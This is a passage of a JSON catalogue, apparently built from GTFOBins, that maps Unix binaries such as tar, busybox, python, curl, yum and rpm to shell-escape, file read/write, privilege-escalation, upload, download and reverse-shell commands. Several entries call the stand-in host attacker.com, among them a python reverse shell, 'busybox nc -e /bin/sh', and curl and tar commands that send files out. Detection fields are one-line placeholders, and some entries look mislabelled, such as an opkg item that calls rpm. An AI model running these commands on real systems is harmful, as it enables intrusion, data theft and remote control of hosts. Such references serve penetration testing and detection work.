                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/script/"
                }
            ]
        },
        {
            "name": "eqn",
            "description": "Unix binary eqn.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "eqn /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor eqn usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/eqn/"
                }
            ]
        },
        {
            "name": "yarn",
            "description": "Unix binary yarn.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "yarn exec /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nyarn --cwd ."
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nyarn --cwd . xxx"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor yarn usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/yarn/"
                }
            ]
        },
        {
            "name": "mosquitto",
            "description": "Unix binary mosquitto.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "mosquitto -c /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mosquitto usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mosquitto/"
                }
            ]
        },
        {
            "name": "yelp",
            "description": "Unix binary yelp.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "yelp man:/path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor yelp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/yelp/"
                }
            ]
        },
        {
            "name": "ionice",
            "description": "Unix binary ionice.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ionice /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ionice usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ionice/"
                }
            ]
        },
        {
            "name": "iptables-save",
            "description": "Unix binary iptables-save.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA\niptables -S\niptables-save -f /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor iptables-save usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/iptables-save/"
                }
            ]
        },
        {
            "name": "torify",
            "description": "Unix binary torify.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "torify /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor torify usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/torify/"
                }
            ]
        },
        {
            "name": "pry",
            "description": "Unix binary pry.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "pry"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pry usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pry/"
                }
            ]
        },
        {
            "name": "ltrace",
            "description": "Unix binary ltrace.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ltrace -F /path/to/input-file /dev/null"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "ltrace -s 999 -o /path/to/input-file ltrace -F DATA"
                },
                {
                    "label": "SHELL: ",
                    "code": "ltrace -b -L /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ltrace usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ltrace/"
                }
            ]
        },
        {
            "name": "xmore",
            "description": "Unix binary xmore.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "xmore /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xmore usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xmore/"
                }
            ]
        },
        {
            "name": "expect",
            "description": "Unix binary expect.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "expect /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "expect -c 'spawn /bin/sh;interact'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor expect usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/expect/"
                }
            ]
        },
        {
            "name": "tar",
            "description": "Unix binary tar.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "tar cf /dev/stdout /path/to/input-file -I 'tar xO'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@"
                },
                {
                    "label": "SHELL: ",
                    "code": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '/bin/sh 0<&1' >/path/to/temp-file\ntar cf /path/to/temp-file.tar /path/to/temp-file\ntar xf /path/to/temp-file.tar --to-command /bin/sh"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tar usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tar/"
                }
            ]
        },
        {
            "name": "man",
            "description": "Unix binary man.",
            "categories": [
                "file-read",
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "man /path/to/input-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "man man"
                },
                {
                    "label": "SHELL: ",
                    "code": "man '-H/bin/sh #' man"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor man usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/man/"
                }
            ]
        },
        {
            "name": "pic",
            "description": "Unix binary pic.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pic /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "pic -U\n.PS\nsh X sh X"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pic usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pic/"
                }
            ]
        },
        {
            "name": "guile",
            "description": "Unix binary guile.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "guile -c '(system \"/bin/sh\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor guile usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/guile/"
                }
            ]
        },
        {
            "name": "grep",
            "description": "Unix binary grep.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "grep '' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor grep usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/grep/"
                }
            ]
        },
        {
            "name": "busybox",
            "description": "Unix binary busybox.",
            "categories": [
                "execute",
                "reverse-shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "busybox ash"
                },
                {
                    "label": "INHERIT: ",
                    "code": "busybox cat"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "busybox nc -e /bin/sh attacker.com 12345"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "busybox httpd -f -p 12345 -h ."
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor busybox usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/busybox/"
                }
            ]
        },
        {
            "name": "yum",
            "description": "Unix binary yum.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "yum localinstall -y x-1.0-1.noarch.rpm"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "yum install http://attacker.com/path/to/input-file.rpm"
                },
                {
                    "label": "INHERIT: ",
                    "code": "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\npluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor yum usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/yum/"
                }
            ]
        },
        {
            "name": "irb",
            "description": "Unix binary irb.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "irb\n..."
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor irb usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/irb/"
                }
            ]
        },
        {
            "name": "screen",
            "description": "Unix binary screen.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "screen -L -Logfile /path/to/output-file echo DATA"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "screen -L /path/to/output-file echo DATA"
                },
                {
                    "label": "SHELL: ",
                    "code": "screen"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor screen usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/screen/"
                }
            ]
        },
        {
            "name": "distcc",
            "description": "Unix binary distcc.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "distcc /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor distcc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/distcc/"
                }
            ]
        },
        {
            "name": "chattr",
            "description": "Unix binary chattr.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "chattr +i /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor chattr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/chattr/"
                }
            ]
        },
        {
            "name": "python",
            "description": "Unix binary python.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "python -c 'print(open(\"/path/to/input-file\").read())'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "python -c 'open(\"/path/to/output-file\",\"w+\").write(\"DATA\")'"
                },
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"/path/to/lib.so\")'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"attacker.com\",12345))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
                },
                {
                    "label": "SHELL: ",
                    "code": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://attacker.com\", open(\"/path/to/input-file\", \"rb\").read())'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "python -c 'import sys\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", 12345), s.SimpleHTTPRequestHandler).serve_forever()'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor python usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/python/"
                }
            ]
        },
        {
            "name": "capsh",
            "description": "Unix binary capsh.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "capsh --"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor capsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/capsh/"
                }
            ]
        },
        {
            "name": "sshuttle",
            "description": "Unix binary sshuttle.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "sudo sshuttle -r x --ssh-cmd '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' localhost"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sshuttle usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sshuttle/"
                }
            ]
        },
        {
            "name": "elvish",
            "description": "Unix binary elvish.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "elvish -c 'print (slurp </path/to/input-file)'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "elvish -c 'print DATA >/path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "elvish"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor elvish usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/elvish/"
                }
            ]
        },
        {
            "name": "curl",
            "description": "Unix binary curl.",
            "categories": [
                "execute",
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "curl http://attacker.com/path/to/input-file -o /path/to/output-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "curl file:///path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\ncurl file:///path/to/temp-file -o /path/to/output-file"
                },
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "curl --engine /path/to/lib.so x"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "curl -X POST --data-binary @/path/to/input-file http://attacker.com"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "curl -X POST --data-binary DATA http://attacker.com"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "curl gopher://attacker.com:12345/_DATA"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor curl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/curl/"
                }
            ]
        },
        {
            "name": "rake",
            "description": "Unix binary rake.",
            "categories": [
                "file-read",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "rake -f /path/to/input-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "rake -p '...'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rake usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rake/"
                }
            ]
        },
        {
            "name": "ascii-xfr",
            "description": "Unix binary ascii-xfr.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ascii-xfr -ns /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ascii-xfr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ascii-xfr/"
                }
            ]
        },
        {
            "name": "troff",
            "description": "Unix binary troff.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "troff /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor troff usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/troff/"
                }
            ]
        },
        {
            "name": "dpkg",
            "description": "Unix binary dpkg.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "dpkg -l"
                },
                {
                    "label": "SHELL: ",
                    "code": "dpkg -i x_1.0_all.deb"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dpkg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dpkg/"
                }
            ]
        },
        {
            "name": "runscript",
            "description": "Unix binary runscript.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor runscript usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/runscript/"
                }
            ]
        },
        {
            "name": "nroff",
            "description": "Unix binary nroff.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nroff /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nroff usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nroff/"
                }
            ]
        },
        {
            "name": "gcore",
            "description": "Unix binary gcore.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "gcore $PID"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gcore usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gcore/"
                }
            ]
        },
        {
            "name": "dnsmasq",
            "description": "Unix binary dnsmasq.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "dnsmasq --conf-script='/path/to/command 1>&2'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dnsmasq usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dnsmasq/"
                }
            ]
        },
        {
            "name": "unsquashfs",
            "description": "Unix binary unsquashfs.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "unsquashfs shell\n./squashfs-root/sh -p"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor unsquashfs usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/unsquashfs/"
                }
            ]
        },
        {
            "name": "ip",
            "description": "Unix binary ip.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ip -force -batch /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "ip netns add foo\nip netns exec foo /bin/sh\nip netns delete foo"
                },
                {
                    "label": "SHELL: ",
                    "code": "ip netns add foo\nip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nip netns exec bar /bin/sh\nip netns delete foo\nip netns delete bar"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ip usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ip/"
                }
            ]
        },
        {
            "name": "ab",
            "description": "Unix binary ab.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "ab -v2 http://attacker.com/path/to/input-file"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "ab -p /path/to/input-file http://attacker.com/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ab usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ab/"
                }
            ]
        },
        {
            "name": "opkg",
            "description": "Unix binary opkg.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "rpm opkg install x_1.0_all.deb"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor opkg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/opkg/"
                }
            ]
        },
        {
            "name": "rustdoc",
            "description": "Unix binary rustdoc.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "rustdoc /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo '//! DATA' >/path/to/temp-file\nrustdoc /path/to/temp-file -o /path/to/output-dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rustdoc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rustdoc/"
                }
            ]
        },
        {
            "name": "systemd-resolve",
            "description": "Unix binary systemd-resolve.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "systemd-resolve --status"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor systemd-resolve usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/systemd-resolve/"
                }
            ]
        },
        {
            "name": "shuf",
            "description": "Unix binary shuf.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "shuf -z /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "shuf -e DATA -o /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor shuf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/shuf/"
                }
            ]
        },
        {
            "name": "7z",
            "description": "Unix binary 7z.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor 7z usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/7z/"
                }
            ]
        },
        {
            "name": "hg",
            "description": "Unix binary hg.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "hg --config alias.x='!/bin/sh' x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor hg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/hg/"
                }
            ]
        },
        {
            "name": "sort",
            "description": "Unix binary sort.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "sort -m /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | sort -m -o /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sort usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sort/"
                }
            ]
        },
        {
            "name": "rpm",
            "description": "Unix binary rpm.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "rpm -ivh x-1.0-1.noarch.rpm"
                },
                {
                    "label": "INHERIT: ",
                    "code": "rpm --eval '%{lua:...}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "rpm --eval '%(/bin/sh 1>&2)'"
                },
                {
                    "label": "SHELL: ",
                    "code": "rpm --pipe '/bin/sh 0<&1'"
                }
            ],
            "mitre": {
                "technique": "T1059",
